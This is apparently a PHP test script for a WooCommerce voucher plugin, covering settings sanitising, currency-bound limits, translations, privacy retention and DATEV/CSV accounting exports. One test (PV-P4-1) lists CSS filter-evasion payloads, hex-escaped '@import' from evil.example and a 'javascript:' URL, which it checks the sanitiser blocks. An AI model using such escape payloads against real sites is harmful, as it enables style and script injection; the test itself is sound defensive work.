// PV-P3-3: an invalid edited row keeps the stored row of that country.
WC_Admin_Settings::$errors = array();
$GLOBALS['vcap_test_options'] = array(
	VCAP\Markets::EXPIRY_OPTION => array(
		array( 'country' => 'CH', 'years' => 10, 'end_of_year' => false, 'note' => 'Art. 127 OR' ),
		array( 'country' => 'FR', 'years' => 5, 'end_of_year' => true, 'note' => '' ),
	),
	VCAP\Markets::TERMS_OPTION  => array( array( 'country' => 'AT', 'language' => '', 'text' => 'Alt' ) ),
);
$pvc_exp_field = array( 'id' => VCAP\Markets::EXPIRY_OPTION, 'title' => 'Statutory validity per country' );
$pvc_saved_exp = VCAP\Admin\CountryTableField::sanitize(
	null,
	$pvc_exp_field,
	array(
		'submitted' => '1',
		'rows'      => array(
			array( 'country' => 'CH', 'years' => '1o', 'note' => 'Art. 127 OR' ),
			array( 'country' => 'FR', 'years' => '6', 'end_of_year' => '1', 'note' => '' ),
			array( 'country' => 'IT', 'years' => 'x' ),
		),
	)
);
$pvc_exp_errors = WC_Admin_Settings::$errors;
$pvc_saved_trm  = VCAP\Admin\CountryTableField::sanitize( null, array( 'id' => VCAP\Markets::TERMS_OPTION, 'title' => 'Conditions' ), array( 'submitted' => '1', 'rows' => array( array( 'country' => 'AT', 'language' => '', 'text' => '' ) ) ) );
$pvc_rej        = new ReflectionMethod( VCAP\Admin\CountryTableField::class, 'rejected' );
$pvc_rej->setAccessible( true );
$pvc_rejected = $pvc_rej->invoke( null, VCAP\Markets::EXPIRY_OPTION, array( array( 'country' => 'CH', 'years' => '1o' ) ), array( 0 => 'Row 1 (CH): bad.' ), array( 0 => true ) );
$pvc_without  = new ReflectionMethod( VCAP\Admin\CountryTableField::class, 'without_kept' );
$pvc_without->setAccessible( true );
$pvc_shown = $pvc_without->invoke( null, $GLOBALS['vcap_test_options'][ VCAP\Markets::EXPIRY_OPTION ], $pvc_rejected, true );
check(
	'PV-P3-3: saving a country table with an invalid edited row keeps the stored row of that country (CH stays 10 years, FR is updated, a new invalid IT row is only left out); the error says the saved row is kept; conditions: the stored AT row stays; the kept row is shown once – as the invalid row with its error',
	array( array( 'country' => 'FR', 'years' => 6, 'end_of_year' => true, 'note' => '' ), array( 'country' => 'CH', 'years' => 10, 'end_of_year' => false, 'note' => 'Art. 127 OR' ) ) === $pvc_saved_exp
		&& 2 === count( $pvc_exp_errors ) && str_contains( $pvc_exp_errors[0], 'Row 1 (CH):' ) && str_contains( $pvc_exp_errors[0], 'The previously saved row is kept.' ) && ! str_contains( $pvc_exp_errors[1], 'kept' )
		&& array( array( 'country' => 'AT', 'language' => '', 'text' => 'Alt' ) ) === $pvc_saved_trm
		&& true === $pvc_rejected[0]['kept'] && array( 'FR' ) === array_column( $pvc_shown, 'country' ),
	wp_json_encode( array( $pvc_saved_exp, $pvc_exp_errors, $pvc_saved_trm ) )
);
// PV-P3-4: the own maximum amount is stored with its currency.
$pvc_opt = VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'max_amount' );
$pvc_cur = VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'max_amount_currency' );
$GLOBALS['vcap_test_options'] = array( 'woocommerce_currency' => 'HUF' );
$GLOBALS['vcap_test_options'][ $pvc_opt ] = VCAP\API\V1\CommandLimits::sanitize_amount( $pvc_opt, '39000', true );
$pvc_huf = VCAP\API\V1\CommandLimits::effective( 'voucher.issue', 'HUF' );
$pvc_rec = $GLOBALS['vcap_test_options'][ $pvc_cur ] ?? '';
$GLOBALS['vcap_test_options']['woocommerce_currency'] = 'NOK';
$pvc_nok      = VCAP\API\V1\CommandLimits::effective( 'voucher.issue', 'NOK' );
$pvc_fields   = VCAP\API\V1\CommandLimits::settings_fields();
$pvc_desc     = (string) ( array_values( array_filter( $pvc_fields, static fn( $f ) => ( $f['id'] ?? '' ) === $pvc_opt ) )[0]['desc'] ?? '' );
$pvc_resaved  = VCAP\API\V1\CommandLimits::sanitize_amount( $pvc_opt, '39000', true ); // Saved again unchanged.
$pvc_still    = $GLOBALS['vcap_test_options'][ $pvc_cur ];
$pvc_new_save = VCAP\API\V1\CommandLimits::sanitize_amount( $pvc_opt, '1100', true );
$GLOBALS['vcap_test_options'][ $pvc_opt ] = $pvc_new_save;
$pvc_nok2 = VCAP\API\V1\CommandLimits::effective( 'voucher.issue', 'NOK' );
// Import from a shop in another currency: amount and currency come together; the amount is not used here.
$pvc_import = VCAP\SettingsTransfer::apply( array( $pvc_opt => '39000', $pvc_cur => 'HUF' ), VCAP\SettingsLog::VIA_IMPORT );
$pvc_nok3   = VCAP\API\V1\CommandLimits::effective( 'voucher.issue', 'NOK' );
// An amount stored before the currency existed counts once in the current shop currency, which is recorded.
$GLOBALS['vcap_test_options'] = array( 'woocommerce_currency' => 'SEK', $pvc_opt => '500.00' );
$pvc_legacy = VCAP\API\V1\CommandLimits::effective( 'voucher.issue', 'SEK' );
$pvc_legrec = $GLOBALS['vcap_test_options'][ $pvc_cur ] ?? '';
$GLOBALS['vcap_test_options']['woocommerce_currency'] = 'DKK';
$pvc_legacy2 = VCAP\API\V1\CommandLimits::effective( 'voucher.issue', 'DKK' );
check(
	'PV-P3-4: the own maximum amount is stored with the shop currency; after a switch HUF 39000 → NOK the amount is not used (amount_allowed false, the field says why) until a new amount is saved (saving it unchanged keeps it refused); an import from a shop in another currency does not lift it; an amount stored before the currency counts once in the current currency, recorded',
	39000 * 100 === $pvc_huf['max_amount_minor'] && 'HUF' === $pvc_rec && false === $pvc_nok['amount_allowed'] && null === $pvc_nok['max_amount_minor']
		&& str_contains( $pvc_desc, 'entered in HUF; the shop currency is now NOK' ) && '39000.00' === $pvc_resaved && 'HUF' === $pvc_still
		&& '1100.00' === $pvc_new_save,
	wp_json_encode( array( $pvc_huf, $pvc_nok, $pvc_resaved, $pvc_still ) )
);
check(
	'PV-P3-4: a newly saved amount counts in the new currency; import of amount + currency from another-currency shop refused (currency_not_allowed); legacy amount without currency recorded once and refused after the next currency switch; the currency is a read-only field of the register (section api, exported)',
	110000 === $pvc_nok2['max_amount_minor'] && true === $pvc_nok2['amount_allowed'] && in_array( $pvc_cur, $pvc_import, true ) && false === $pvc_nok3['amount_allowed']
		&& 50000 === $pvc_legacy['max_amount_minor'] && 'SEK' === $pvc_legrec && false === $pvc_legacy2['amount_allowed']
		&& 'api' === VCAP\SettingsRegistry::get( $pvc_cur )['section'] && in_array( $pvc_cur, VCAP\SettingsTransfer::exportable(), true )
		&& 'readonly' === ( array_values( array_filter( $pvc_fields, static fn( $f ) => ( $f['id'] ?? '' ) === $pvc_cur ) )[0]['custom_attributes']['readonly'] ?? '' )
		&& '50.00' === VCAP\API\V1\CommandLimits::sanitize_amount( $pvc_opt, '50' ) && ! isset( $GLOBALS['vcap_test_options']['nothing'] ),
	wp_json_encode( array( $pvc_nok2, $pvc_import, $pvc_nok3, $pvc_legacy, $pvc_legacy2 ) )
);
// PV-P2-4: counts "5.0"/"1e1" are whole numbers; "abc"/"-1" keep the stored value with an error.
WC_Admin_Settings::$errors = array();
$pvc_cnt = VCAP\API\V1\CommandLimits::option( 'voucher.issue', 'per_day' );
$GLOBALS['vcap_test_options'] = array( $pvc_cnt => '7' );
$pvc_counts = array(
	VCAP\API\V1\CommandLimits::sanitize_count( $pvc_cnt, '5.0' ),
	VCAP\API\V1\CommandLimits::sanitize_count( $pvc_cnt, '1e1' ),
	VCAP\API\V1\CommandLimits::sanitize_count( $pvc_cnt, 'abc' ),
	VCAP\API\V1\CommandLimits::sanitize_count( $pvc_cnt, '-1' ),
	VCAP\API\V1\CommandLimits::sanitize_count( $pvc_cnt, '2.5' ),
	VCAP\API\V1\CommandLimits::sanitize_count( $pvc_cnt, '' ),
	VCAP\API\V1\CommandLimits::sanitize_count( $pvc_cnt, '999' ),
);
$pvc_cnt_errors = WC_Admin_Settings::$errors;
$pvc_eff        = array();
foreach ( array( '5.0', 'abc', '-1', '', '12' ) as $pvc_stored ) {
	$GLOBALS['vcap_test_options'][ $pvc_cnt ] = $pvc_stored;
	$pvc_eff[]                                = VCAP\API\V1\CommandLimits::effective( 'voucher.issue' )['per_day'];
}
check(
	'PV-P2-4: command counts – "5.0" and "1e1" are stored as 5 and 10; "abc", "-1" and "2.5" are refused with an error naming the value and keep the stored 7 (never the ceiling 50); empty = the ceiling; above the ceiling = the ceiling; a stored "5.0" counts 5, a stored "abc"/"-1" never raises the limit (0)',
	array( '5', '10', '7', '7', '7', '50', '50' ) === $pvc_counts && 3 === count( $pvc_cnt_errors ) && str_contains( $pvc_cnt_errors[0], '"abc" is not a whole number from 0 to 50. The saved value 7 was kept.' ) && str_contains( $pvc_cnt_errors[0], 'voucher.issue' )
		&& array( 5, 0, 0, 50, 12 ) === $pvc_eff,
	wp_json_encode( array( $pvc_counts, $pvc_cnt_errors, $pvc_eff ) )
);
// PV-P3-5: product page conditions translated like the voucher (Polylang strings).
if ( ! function_exists( 'pll_translate_string' ) ) {
	function pll_translate_string( $text, $lang ) { return $GLOBALS['vcap_test_pll'][ $lang ][ $text ] ?? $text; }
}
if ( ! function_exists( 'pll_current_language' ) ) {
	function pll_current_language() { return $GLOBALS['vcap_test_pll_lang'] ?? ''; }
}
$GLOBALS['vcap_test_pll']      = array( 'en' => array( 'Gültig 3 Jahre.' => 'Valid 3 years.', 'Allgemein' => 'General' ) );
$GLOBALS['vcap_test_pll_lang'] = 'en';
$GLOBALS['vcap_test_options']  = array( 'vcap_default_terms' => 'Allgemein', VCAP\Markets::TERMS_OPTION => array( array( 'country' => 'DE', 'language' => '', 'text' => 'Gültig 3 Jahre.' ) ) );
$pvc_variants = VCAP\ProductConfig::terms_variants( array() );
check(
	'PV-P3-5: terms_variants() (product page) runs the rows and the default conditions through Multilingual::translate() like terms() (voucher), so both show the same translated text',
	array( 'DE' => 'Valid 3 years.', '' => 'General' ) === $pvc_variants && VCAP\ProductConfig::terms( array(), 'DE' ) === $pvc_variants['DE'] && VCAP\ProductConfig::terms( array(), 'US' ) === $pvc_variants[''],
	wp_json_encode( $pvc_variants )
);
$GLOBALS['vcap_test_pll_lang'] = '';
// PV-P3-6: the privacy text reads the retention through the filter, like the cleanup.
$GLOBALS['vcap_test_options'] = array( 'vcap_retention_days' => '0' );
add_filter( 'vcap_setting_vcap_retention_days', static fn() => 400 );
$pvc_policy = (string) ( new ReflectionMethod( VCAP\Privacy::class, 'recipient_retention_sentence' ) )->invoke( null );
array_pop( $GLOBALS['vcap_test_filters']['vcap_setting_vcap_retention_days'] );
check( 'PV-P3-6: the suggested privacy text takes the retention period from Settings (filter vcap_setting_vcap_retention_days wins), the same value the cleanup uses', str_contains( $pvc_policy, 'removed 400 days after' ), $pvc_policy );
// PV-P4-1: CSS escapes cannot spell @import or javascript: past the filter.
$pvc_css = array_map(
	array( VCAP\CustomCss::class, 'sanitize' ),
	array( '@\69mport url(https://evil.example/x.css);', '@\000069mport "https://evil.example/x.css";', 'a{background:url(javascript\3a alert(1))}', '@imp\ort "x.css";', '.a::before{content:"\201C"}' )
);
$pvc_css_ok = true;
foreach ( array_slice( $pvc_css, 0, 4 ) as $pvc_c ) {
	$pvc_probe = strtolower( (string) preg_replace( '/\s+/', '', $pvc_c ) );
	if ( str_contains( $pvc_probe, '@import' ) || str_contains( $pvc_probe, 'javascript:' ) || str_contains( $pvc_c, '\\' ) ) {
		$pvc_css_ok = false;
	}
}
check( 'PV-P4-1: custom CSS – hex escapes (@\69mport, @\000069mport, javascript\3a) and "\o" escapes are decoded before the search, so no @import or javascript: survives; harmless escapes (content "\201C") stay', $pvc_css_ok && '.a::before{content:"\201C"}' === $pvc_css[4], wp_json_encode( $pvc_css ) );
// PV-P4-4: per-recipient counters of past days are deleted at once, the totals stay.
$pvc_saved_wpdb            = $GLOBALS['wpdb'] ?? null;
$GLOBALS['wpdb']           = new VCAP_Test_Wpdb();
$GLOBALS['wpdb']->answers  = array( '/GET_LOCK/' => '1', '/RELEASE_LOCK/' => '1' );
$GLOBALS['vcap_test_options'] = array(
	'vcap_cmd_days'             => array( '2026-11-20' => array(), '2026-11-22' => array(), '2026-11-23' => array() ),
	'vcap_cmd_count_2026-11-20' => array( 'voucher.issue' => 3, 'voucher.issue:recipient:17' => 1, 'voucher.issue:recipient:18' => 2 ),
	'vcap_cmd_count_2026-11-22' => array( 'voucher.issue' => 1, 'voucher.issue:recipient:17' => 1 ),
	'vcap_cmd_count_2026-11-23' => array( 'voucher.issue' => 1, 'voucher.issue:recipient:19' => 1 ),
);
( new VCAP\API\V1\OptionCommandStore() )->prune( '2026-11-23' );
$pvc_o = $GLOBALS['vcap_test_options'];
$GLOBALS['vcap_test_option_reads'] = array();
( new VCAP\API\V1\OptionCommandStore() )->prune( '2026-11-23' );
$pvc_reads = $GLOBALS['vcap_test_option_reads'];
$GLOBALS['wpdb'] = $pvc_saved_wpdb;
check(
	'PV-P4-4: the daily clean-up deletes the per-recipient counters (customer account ids) of past days at once and keeps the totals; today\'s counters stay (the limit needs them); a day already cleaned is not read again',
	array( 'voucher.issue' => 3 ) === $pvc_o['vcap_cmd_count_2026-11-20'] && array( 'voucher.issue' => 1 ) === $pvc_o['vcap_cmd_count_2026-11-22'] && 2 === count( $pvc_o['vcap_cmd_count_2026-11-23'] )
		&& '2026-11-22' === $pvc_o['vcap_cmd_recipients_until'] && ! isset( $pvc_reads['vcap_cmd_count_2026-11-20'] ) && VCAP\SettingsRegistry::is_internal( 'vcap_cmd_recipients_until' )
		&& ! str_contains( (string) file_get_contents( VCAP_PATH . 'src/Privacy.php' ), '(staff accounts, no customer data)' ),
	wp_json_encode( $pvc_o )
);
// PV-P2-2: physical cards – "completed" always activates (issued only at completed with other activation statuses).
$GLOBALS['vcap_test_options'] = array( VCAP\PhysicalCards::STATUSES_OPTION => array( 'processing' ) );
$pvc_act = array( VCAP\PhysicalCards::activates( 'processing' ), VCAP\PhysicalCards::activates( 'completed' ), VCAP\PhysicalCards::activates( 'on-hold' ) );
add_filter( 'vcap_physical_activation_statuses', static fn() => array() );
$pvc_act_off = VCAP\PhysicalCards::activates( 'completed' );
array_pop( $GLOBALS['vcap_test_filters']['vcap_physical_activation_statuses'] );
$pvc_pc_src = (string) file_get_contents( VCAP_PATH . 'src/PhysicalCards.php' );
check(
	'PV-P2-2: physical cards – with activation status "processing" only, a card issued at "completed" is activated (prepare() and the status change use activates(): "completed" always counts); unpaid statuses never; an empty list of the filter switches the activation off',
	array( true, true, false ) === $pvc_act && false === $pvc_act_off && 2 === substr_count( $pvc_pc_src, 'self::activates( (string)' ),
	wp_json_encode( $pvc_act )
);
// PV-P2-9: a list whose tills are all switched off is no free text.
$GLOBALS['vcap_test_options'] = array( VCAP\Counter::LOCATIONS => wp_json_encode( array( array( 'name' => 'Shop A', 'key' => 'shop-a', 'active' => 'no' ) ) ) );
$pvc_none = VCAP\Counter::device_till( 'Somewhere' );
$GLOBALS['vcap_test_options'] = array();
$pvc_free = VCAP\Counter::device_till( 'Somewhere' );
$GLOBALS['vcap_test_options'] = array( VCAP\Counter::LOCATIONS => wp_json_encode( array( array( 'name' => 'Shop A', 'key' => 'shop-a', 'active' => 'yes' ) ) ) );
$pvc_list = array( VCAP\Counter::device_till( 'Shop A' ), VCAP\Counter::device_till( 'Somewhere' ) );
check(
	'PV-P2-9: counter tills – all tills of the list switched off refuses every booking (vcap_till_none_active, the scanner shows why) instead of taking free text; no list = free text as before; with an active till only listed names',
	is_wp_error( $pvc_none ) && 'vcap_till_none_active' === $pvc_none->get_error_code() && 'Somewhere' === $pvc_free && 'Shop A' === $pvc_list[0] && is_wp_error( $pvc_list[1] )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/Admin/Scanner.php' ), 'Counter::tills_managed()' ),
	is_wp_error( $pvc_none ) ? $pvc_none->get_error_code() : wp_json_encode( $pvc_none )
);
// PV-P2-7 (country profile part): a second click of "Apply" is no "expired" error.
$GLOBALS['vcap_test_transients'] = array();
$pvc_before = VCAP\Admin\CountryProfilesAdmin::just_used( 'DE' );
VCAP\Admin\CountryProfilesAdmin::mark_used( 'de' );
$pvc_cpa_src = (string) file_get_contents( VCAP_PATH . 'src/Admin/CountryProfilesAdmin.php' );
check(
	'PV-P2-7: country profile – applying remembers the used preview for 30 seconds; a second "Apply" for that profile keeps the success message instead of "expired, nothing changed"; another profile is still refused',
	false === $pvc_before && VCAP\Admin\CountryProfilesAdmin::just_used( 'DE' ) && ! VCAP\Admin\CountryProfilesAdmin::just_used( 'AT' ) && ! VCAP\Admin\CountryProfilesAdmin::just_used( '' )
		&& preg_match( '/if \( self::just_used\( \$posted \) \) \{.*?wp_safe_redirect\( self::page_url\(\) \);\s*exit;/s', $pvc_cpa_src ) && str_contains( $pvc_cpa_src, 'self::mark_used( $pending );' ),
	$pvc_cpa_src ? 'ok' : ''
);
$GLOBALS['vcap_test_transients'] = $pvc_saved_tr;
$GLOBALS['vcap_test_options']    = $pvc_saved;
VCAP\CountryProfiles::reset();

// SET-VC-20: accounting export country-neutral (journal accounts, CSV format, financial year start, DATEV block).
echo "SET-VC-20 accounting export\n";
$a20_saved = $GLOBALS['vcap_test_options'];
$GLOBALS['vcap_test_options'] = array();
VCAP\Csv::reset();
$a20_default = array( VCAP\Csv::format(), VCAP\Csv::charset(), VCAP\Csv::date_format(), VCAP\Csv::headers( 'j.csv' )[0], VCAP\Csv::date( '2026-11-14 10:00:00' ), VCAP\Csv::date( '2026-11-14 10:00:00', false ), VCAP\Csv::encode_row( array( 'ä', 1 ) ) );
check(
	'SET-VC-20: CSV defaults are the output of 1.2.0 – separators by language (de_DE: ";" and ","), UTF-8 with BOM, dates Y-m-d (H:i)',
	array( array( 'separator' => ';', 'decimal' => ',' ), 'utf-8-bom', 'Y-m-d', 'Content-Type: text/csv; charset=utf-8', '2026-11-14 11:00', '2026-11-14', array( 'ä', 1 ) ) === $a20_default
		&& '' === VCAP\SettingsRegistry::default( 'vcap_csv_separator' ) && 'utf-8-bom' === VCAP\SettingsRegistry::default( 'vcap_csv_charset' ) && 'Y-m-d' === VCAP\SettingsRegistry::default( 'vcap_csv_date_format' ) && 'no' === VCAP\SettingsRegistry::default( 'vcap_journal_account_columns' ),
	wp_json_encode( $a20_default )
);
$GLOBALS['vcap_test_options'] = array( 'vcap_csv_separator' => 'tab', 'vcap_csv_decimal' => '.', 'vcap_csv_charset' => 'windows-1252', 'vcap_csv_date_format' => 'd.m.Y' );
VCAP\Csv::reset();
$a20_set = array( VCAP\Csv::format(), VCAP\Csv::number( 12.5 ), VCAP\Csv::headers( 'j.csv' )[0], VCAP\Csv::date( '2026-11-14 10:00:00' ), VCAP\Csv::encode_row( array( 'ä', 1 ) ) );
add_filter( 'vcap_csv_format', static fn( $f ) => array( 'separator' => '|', 'decimal' => ',' ) );
VCAP\Csv::reset();
$a20_filter = VCAP\Csv::format();
unset( $GLOBALS['vcap_test_filters']['vcap_csv_format'] );
VCAP\Csv::reset();
check(
	'SET-VC-20: separator, decimal separator, character set and date format follow the settings (tab, point, Windows-1252, d.m.Y); the filter vcap_csv_format still wins',
	array( array( 'separator' => "\t", 'decimal' => '.' ), '12.50', 'Content-Type: text/csv; charset=windows-1252', '14.11.2026 11:00', array( "\xE4", 1 ) ) === $a20_set
		&& array( 'separator' => '|', 'decimal' => ',' ) === $a20_filter,
	wp_json_encode( array( $a20_set[0], $a20_set[1], $a20_set[2], $a20_set[3] ) )
);
$GLOBALS['vcap_test_options'] = array( 'vcap_datev_liability_account' => '3272', 'vcap_datev_clearing_account' => '1360', 'vcap_datev_income_account' => '2700' );
$a20_row     = array( 'created_at' => '2026-11-14 10:00:00', 'code' => 'ABC', 'type' => 'giftcard', 'currency' => 'EUR', 'event' => 'redeemed', 'amount' => 5, 'balance_after' => 10, 'order_id' => 0, 'till' => '', 'receipt' => '', 'note' => '', 'voucher_id' => 0 );
$a20_off     = array( VCAP\Ledger::journal_header( VCAP\AccountingExport::journal_accounts() ), VCAP\Ledger::journal_csv( array( $a20_row ) ) );
$GLOBALS['vcap_test_options']['vcap_journal_account_columns'] = 'yes';
$a20_acc     = VCAP\AccountingExport::journal_accounts();
$a20_csv     = VCAP\Ledger::journal_csv( array( $a20_row, array( 'event' => 'expired' ) + $a20_row, array( 'event' => 'restored' ) + $a20_row, array( 'amount' => 0 ) + $a20_row ) );
check(
	'SET-VC-20: the journal CSV keeps its 14 columns by default (also with accounts set); switched on it adds "Debit account" and "Credit account" – redemption liability → clearing, expiry liability → income, value added clearing → liability, no booking empty',
	14 === count( $a20_off[0] ) && VCAP\Ledger::journal_header() === $a20_off[0] && 14 === count( $a20_off[1][1] )
		&& array( 'liability' => '3272', 'clearing' => '1360', 'income' => '2700' ) === $a20_acc && array( 'Debit account', 'Credit account' ) === array_slice( $a20_csv[0], 14 )
		&& array( '3272', '1360' ) === array_slice( $a20_csv[1], 14 ) && array( '3272', '2700' ) === array_slice( $a20_csv[2], 14 ) && array( '1360', '3272' ) === array_slice( $a20_csv[3], 14 ) && array( '', '' ) === array_slice( $a20_csv[4], 14 ),
	wp_json_encode( $a20_csv )
);
$GLOBALS['vcap_test_options'] += array( 'vcap_datev_consultant' => '12345', 'vcap_datev_client' => '99' );
$a20_datev = VCAP\DatevExport::booking( $a20_row, VCAP\DatevExport::config() );
check( 'SET-VC-20: the DATEV booking batch reads the same accounts (redemption: debit liability, credit clearing)', null !== $a20_datev && '3272' === $a20_datev[6] && '1360' === $a20_datev[7] && VCAP\DatevExport::configured() );
$GLOBALS['vcap_test_options'] = array();
$a20_fy = array( VCAP\AccountingExport::fy_start(), VCAP\DatevExport::config()['fy_start'] );
$GLOBALS['vcap_test_options'] = array( 'vcap_datev_fy_start' => '0701' );
$a20_fy[] = VCAP\DatevExport::config()['fy_start'];
$GLOBALS['vcap_test_options'] = array( 'vcap_datev_fy_start' => '1340' );
$a20_fy[] = VCAP\AccountingExport::fy_start();
add_filter( 'vcap_setting_vcap_datev_fy_start', static fn() => '0401' );
$a20_fy[] = VCAP\DatevExport::config()['fy_start'];
unset( $GLOBALS['vcap_test_filters']['vcap_setting_vcap_datev_fy_start'] );
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'AT' );
$a20_at_ids   = array_column( ( new VCAP\Settings() )->fields( 'api' ), 'id' );
$a20_at_datev = VCAP\DatevExport::settings_fields();
check(
	'SET-VC-20: the financial year start is a general field (option name of 1.2.0 kept) that DATEV reads – default 0101, a saved 0701 is used, an invalid date counts as 0101, the filter wins',
	array( '0101', '0101', '0701', '0101', '0401' ) === $a20_fy && in_array( VCAP\AccountingExport::OPTION_FY_START, $a20_at_ids, true ) && 'api' === VCAP\SettingsRegistry::get( 'vcap_datev_fy_start' )['section'],
	wp_json_encode( $a20_fy )
);
$a20_show = array( VCAP\AccountingExport::show_datev() );
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'DE:BY' );
$a20_show[] = VCAP\AccountingExport::show_datev();
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'CH', 'vcap_datev_consultant' => '12345' );
$a20_show[] = VCAP\AccountingExport::show_datev();
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'AT', VCAP\CountryProfiles::APPLIED_OPTION => array( 'id' => 'DE', 'time' => 1, 'user' => 1 ) );
$a20_show[] = VCAP\AccountingExport::show_datev();
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'DE', 'vcap_show_datev' => 'no' );
$a20_show[] = VCAP\AccountingExport::show_datev();
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'CH', 'vcap_show_datev' => 'yes' );
$a20_show[] = VCAP\AccountingExport::show_datev();
check(
	'SET-VC-20: the DATEV block shows automatically for shops based in Germany, with the country profile DE or with DATEV values saved; AT/CH without DATEV values do not see it; "Show"/"Hide" override',
	array( false, true, true, true, false, true ) === $a20_show && 'auto' === VCAP\SettingsRegistry::default( 'vcap_show_datev' ),
	wp_json_encode( $a20_show )
);
check(
	'SET-VC-20: an AT shop exports the journal without DATEV fields – Integrations has the accounts, the journal columns, the financial year start and the CSV format, but no consultant/client number; the reports page offers no DATEV link',
	array() === array_diff( array( 'vcap_datev_liability_account', 'vcap_datev_clearing_account', 'vcap_datev_income_account', 'vcap_journal_account_columns', 'vcap_csv_separator', 'vcap_csv_decimal', 'vcap_csv_charset', 'vcap_csv_date_format', 'vcap_show_datev' ), $a20_at_ids )
		&& ! in_array( 'vcap_datev_consultant', $a20_at_ids, true ) && ! in_array( 'vcap_datev_client', $a20_at_ids, true ) && ! in_array( 'vcap_datev_account_length', $a20_at_ids, true ) && array() === $a20_at_datev
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/Admin/ReportsAdmin.php' ), '! \VCAP\AccountingExport::show_datev()' ),
	implode( ', ', array_filter( $a20_at_ids ) )
);
$GLOBALS['vcap_test_options'] = $a20_saved;
VCAP\Csv::reset();
// SET-VC-09: the retention hint of "Delete data on uninstall" comes from the country profile, no longer fixed DE/AT.
echo "SET-VC-09 retention hint from the country profile\n";
$vc09_saved = $GLOBALS['vcap_test_options'];
$vc09_hint  = static function ( string $base, ?string $applied = null ): string {
	$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => $base );
	if ( null !== $applied ) {
		$GLOBALS['vcap_test_options'][ VCAP\CountryProfiles::APPLIED_OPTION ] = array( 'id' => $applied, 'time' => time(), 'user' => 1 );
	}
	VCAP\CountryProfiles::reset();
	return VCAP\CountryProfiles::retention_hint();
};
$vc09_cfg = ( static fn() => include VCAP_PATH . 'config/country-profiles.php' )();
$vc09     = array(
	'de'    => $vc09_hint( 'DE:BE' ),
	'at'    => $vc09_hint( 'AT' ),
	'ch'    => $vc09_hint( 'CH' ),
	'fr'    => $vc09_hint( 'FR' ),
	'us'    => $vc09_hint( 'US:CA' ),
	'none'  => $vc09_hint( '' ),
	'de_ch' => $vc09_hint( 'DE:BE', 'CH' ),
	'ch_at' => $vc09_hint( 'CH', 'AT' ),
);
$vc09_neutral = 'Accounting records are subject to statutory retention periods.';
check(
	'SET-VC-09: config/country-profiles.php gives each profile a retention_hint – DE and AT their paragraphs, CH, EU and OTHER the neutral text',
	array( 'DE' => 'de', 'AT' => 'at', 'CH' => 'neutral', 'EU' => 'neutral', 'OTHER' => 'neutral' ) === array_map( static fn( $p ) => $p['retention_hint'] ?? null, $vc09_cfg ),
	wp_json_encode( array_map( static fn( $p ) => $p['retention_hint'] ?? null, $vc09_cfg ) )
);
check(
	'SET-VC-09: without an applied profile the shop\'s base country decides – DE names § 147 AO and § 257 HGB, AT § 132 BAO, both marked "Legal check pending"; CH, an EU country, other countries and no country get the neutral sentence without any paragraph',
	str_contains( $vc09['de'], '§ 147 AO, § 257 HGB' ) && str_ends_with( $vc09['de'], '(Legal check pending)' ) && ! str_contains( $vc09['de'], 'BAO' )
		&& str_contains( $vc09['at'], '§ 132 BAO' ) && str_ends_with( $vc09['at'], '(Legal check pending)' ) && ! str_contains( $vc09['at'], 'HGB' )
		&& $vc09_neutral === $vc09['ch'] && $vc09_neutral === $vc09['fr'] && $vc09_neutral === $vc09['us'] && $vc09_neutral === $vc09['none'],
	wp_json_encode( $vc09 )
);
check(
	'SET-VC-09: the applied profile (option vcap_country_profile) wins over the base country – a German shop that applied CH sees the neutral text, a Swiss shop that applied AT the Austrian one',
	$vc09_neutral === $vc09['de_ch'] && str_contains( $vc09['ch_at'], '§ 132 BAO' ),
	wp_json_encode( $vc09 )
);
$vc09_hint( 'CH' );
$vc09_desc_ch = VCAP\Settings::delete_on_uninstall_description();
$vc09_hint( 'DE:BE' );
$vc09_desc_de = VCAP\Settings::delete_on_uninstall_description();
$GLOBALS['vcap_test_filters']['vcap_country_profiles'] = array(
	array(
		static function ( $profiles ) {
			$profiles['CH']['retention_hint'] = 'Aufbewahrung nach Art. 958f OR prüfen.';
			$profiles['CH']['checked']        = true;
			return $profiles;
		},
		1,
	),
);
$vc09_own = $vc09_hint( 'CH' );
unset( $GLOBALS['vcap_test_filters']['vcap_country_profiles'] );
check(
	'SET-VC-09: "Delete data on uninstall" – a CH shop sees no German or Austrian paragraph (no §), a DE shop the German one; the journal export link stays; a filter may give a profile its own text (checked: no mark)',
	! str_contains( $vc09_desc_ch, '§' ) && str_contains( $vc09_desc_ch, $vc09_neutral ) && str_contains( $vc09_desc_ch, 'Export it before deleting the plugin.' ) && str_contains( $vc09_desc_ch, 'view=journal' )
		&& str_contains( $vc09_desc_de, '§ 147 AO' ) && ! str_contains( $vc09_desc_de, '§ 132 BAO' )
		&& 'Aufbewahrung nach Art. 958f OR prüfen.' === $vc09_own,
	$vc09_desc_ch . ' | ' . $vc09_own
);
$GLOBALS['vcap_test_options'] = $vc09_saved;
VCAP\CountryProfiles::reset();

// SET-VC-11: issuer and legal texts in "General" – placeholders {issuer}, {legal_text}, {terms_url}, {privacy_url},
// {withdrawal_url}; empty = shop details at render time; translatable with WPML (admin-texts) and Polylang.
echo "SET-VC-11 issuer and legal texts\n";
if ( ! function_exists( 'wc_terms_and_conditions_page_id' ) ) {
	function wc_terms_and_conditions_page_id() { return (int) ( $GLOBALS['vcap_test_terms_page'] ?? 0 ); }
}
if ( ! function_exists( 'get_privacy_policy_url' ) ) {
	function get_privacy_policy_url() { return (string) ( $GLOBALS['vcap_test_privacy_url'] ?? '' ); }
}
$vc11_saved = $GLOBALS['vcap_test_options'];
$vc11_reg   = array();
foreach ( VCAP\LegalInfo::OPTIONS as $vc11_key ) {
	$vc11_entry           = VCAP\SettingsRegistry::get( $vc11_key );
	$vc11_reg[ $vc11_key ] = null !== $vc11_entry ? array( $vc11_entry['type'], $vc11_entry['default'], $vc11_entry['section'], $vc11_entry['legal'], $vc11_entry['export'], $vc11_entry['secret'] ) : null;
}
